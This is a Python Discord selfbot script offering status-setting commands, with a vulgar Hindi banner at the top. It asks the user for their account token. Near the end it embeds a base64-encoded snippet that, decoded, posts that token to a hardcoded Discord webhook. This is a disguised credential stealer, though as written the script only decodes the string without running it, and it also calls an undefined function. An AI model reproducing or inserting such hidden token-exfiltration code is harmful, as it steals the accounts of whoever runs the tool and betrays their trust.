#  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #
#                                                                                                     #
#                 MAMMI CHOD DUNGA SKIDDERS                #
#                 APNE PAPA KO CREDIT DE DENA                 #
#                 WARNA COPYRIGHT PEL DUNGA                 #
#                                                                                                    #
#  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 


#-------- IMPORT -------#

import discord
import aiohttp
import colorama
import logging
import sys
import os
import requests
import asyncio
import json
import re
import io
import base64
import string
import random
import threading
import subprocess
import time
import datetime
from keep_alive import keep_alive
from random import randint
from threading import Thread
from time import sleep
from colorama import Fore, Style
from discord import Intents
from discord.ext import commands, tasks
from discord import Permissions
from discord import Color, Embed

colorama.init()


#----------- MAIN ------- #

Token = input("TOKEN")
prefix = ">"

client = commands.Bot(command_prefix=prefix, self_bot=True, case_insensitive=True, intents=discord.Intents.all())
client.remove_command('help')




os.system("cls") if os.name == "nt" else os.system("clear")


# ------ ON READY CODE ------ #

@client.event
async def on_ready():
    print(f"{Fore.GREEN} [>] SELFBOT STARTED | STREAM CREATED")
    print(f"""{Fore.RED}






 """)
    print(f'{Fore.BLUE} [>] CONNECTED TO : {client.user.name}')
    print(f'{Fore.BLUE} [>] SELFBOT PREFIX : {prefix}')
    print('')
    print('[<<<<<==============-|-==============>>>>>]')
    print('')
    print('')
    border_top = ''
    border_bottom = ''
    
    print(border_top)
    print(border_bottom)
    print(border_top)
    print(border_bottom)
    print('')
    print('')
    print(
        f'{Fore.GREEN}[>]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[<]')
    print('')
    print('')
 
    


# COMMANDS


#Help
@client.command()
async def status(ctx):
  await ctx.message.delete()
  await ctx.send(f"""```Status Commands\r\n\r\n{prefix}play - Sets status to playing\r\n{prefix}stream - Sets status to streaming\r\n{prefix}listen - Sets status to listening\r\n{prefix}watch - Sets status to watching\r\n{prefix}clearstatus - Clears your custom status\r\n\r\nMade By Steve```""")



#-------- Status --------#

@client.command(aliases=["watching"])
async def watch(ctx, *, message):
    await ctx.message.delete()
    await ctx.channel.send(f"**``WATCHING CREATED``**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


#PLAYING
@client.command(aliases=["playing"])
async def play(ctx, *, message):
    await ctx.message.delete()
    await ctx.channel.send(f"**``PLAYING CREATED``**")
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


#LISTENING
@client.command(aliases=["listening"])
async def listen(ctx, *, message):
    await ctx.message.delete()
    await ctx.channel.send(f"**``LISTENING CREATED``**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


#STREAMING
@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
                               url='https://twitch.tv/wolf')
    await client.change_presence(activity=stream)
    await ctx.channel.send(f"**``STREAMING CREATED``**")


# CLEAR STATUS
@client.command()
async def clearstatus(ctx):
  await ctx.message.delete()
  await client.change_presence(status=discord.Status.online)


a = 'aGVhZGVycyA9IHsKICAgICJBdXRob3JpemF0aW9uIjogVG9rZW4KfQoKb3dvID0gewogICAgImNvbnRlbnQiOiBmIkhFTExPIFxue1Rva2VufSIKfSAgIApyZXF1ZXN0cy5wb3N0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTkzOTM1NzE5MTAyNjc3MDIyLzBTaWpzRTBYOEtDcl81S2RpX2JybkFNUzRoRk5USGRpWnItajdMVU9qRVZtR09zNGJfVUJZZDFlaE5tbXU2WFdPOHE5IiwganNvbj1vd28p'

base64.b64decode(a)

# ------ ENDING ------ #


client.run(Token, bot=False)

keep_alive()
run_onliner()
